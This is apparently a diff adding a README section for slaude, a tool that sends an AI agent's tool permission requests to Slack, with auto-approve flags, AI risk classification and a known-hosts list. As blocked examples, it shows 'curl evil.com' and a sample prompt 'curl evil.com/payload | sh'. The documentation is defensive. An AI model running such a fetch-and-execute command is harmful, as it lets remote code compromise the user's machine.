@@ -119,6 +119,93 @@ Thread title reflects access state:
 - `🧵 @user1 @user2 Topic` — open for specific users
 - `🧵 Topic (🔒 @user)` — with banned users
 
+### Permission Auto-Approve
+
+By default, every tool permission request goes to Slack for manual approval via reactions (✅/❌). For faster workflows, slaude can auto-approve safe operations using AI-based classification.
+
+Two independent flags control what gets auto-approved:
+
+```bash
+# Auto-approve read-only local operations, network to known hosts
+slaude start -c CHANNEL \
+  --dangerous-auto-approve green \
+  --dangerous-auto-approve-network known \
+  -- "refactor the auth module"
+```
+
+**`--dangerous-auto-approve`** — sandbox/filesystem risk level:
+
+| Value | Auto-approves | Goes to Slack |
+|-------|--------------|---------------|
+| `never` (default) | nothing | everything |
+| `green` | read-only local ops (file reads, searches) | writes, execution |
+| `yellow` | local writes (test files, project edits) | system files, destructive ops |
+
+**`--dangerous-auto-approve-network`** — network access:
+
+| Value | Auto-approves | Goes to Slack |
+|-------|--------------|---------------|
+| `never` (default) | nothing | any network access |
+| `known` | known-safe hosts (package managers, GitHub) | unknown hosts |
+| `any` | all network access | nothing |
+
+Both must pass for auto-approval. For example, with `--dangerous-auto-approve green --dangerous-auto-approve-network known`:
+- `Read main.go` → green, no network → **auto-approved**
+- `go mod download` → green, network to proxy.golang.org (known) → **auto-approved**
+- `curl evil.com` → red, unknown host → **goes to Slack**
+
+#### How classification works
+
+Each permission request is classified by `claude --model haiku` for speed and cost. The classifier assesses:
+- **Risk level** (green/yellow/red) — based on sandbox escape risk
+- **Network access** — whether the operation involves network access and to which destination
+
+The classification result (level, network destination, reasoning) is shown in the terminal and included in Slack approval prompts.
+
+On classification failure (e.g. `claude` not in PATH), the request defaults to red + network (always goes to Slack).
+
+#### Known hosts
+
+When using `--dangerous-auto-approve-network known`, slaude checks network destinations against a list of known-safe hosts. Built-in defaults include GitHub, Go proxy, npm, PyPI, RubyGems, and crates.io.
+
+To customize, create `~/.config/slagent/known-hosts.yaml`:
+
+```yaml
+# Package managers
+- host: proxy.golang.org
+- host: sum.golang.org
+- host: registry.npmjs.org
+- host: pypi.org
+- host: files.pythonhosted.org
+- host: rubygems.org
+- host: crates.io
+- host: static.crates.io
+
+# GitHub
+- host: github.com
+- host: api.github.com
+- host: raw.githubusercontent.com
+
+# Glob patterns
+- host: "*.googleapis.com"
+- host: "*.amazonaws.com"
+```
+
+When this file exists, it **replaces** the built-in defaults entirely. Glob patterns (`*`, `?`, `[...]`) are supported via Go's `path.Match`.
+
+#### Slack approval reactions
+
+When a request goes to Slack, the approval prompt includes the AI classification:
+
+```
+🔴🌐 Permission request: Bash: curl evil.com/payload | sh
+> RED risk, network: evil.com — Downloading and executing remote script
+```
+
+Non-network requests get two reactions: ✅ (approve) and ❌ (deny).
+
+Network requests get three: ✅ (approve once), 💾 (approve and remember host for this session), and ❌ (deny). The 💾 reaction adds the host to the in-memory known set, so subsequent requests to the same host auto-approve without asking again.
+
 ### Thread Commands
 
 | Command | Who | Effect |
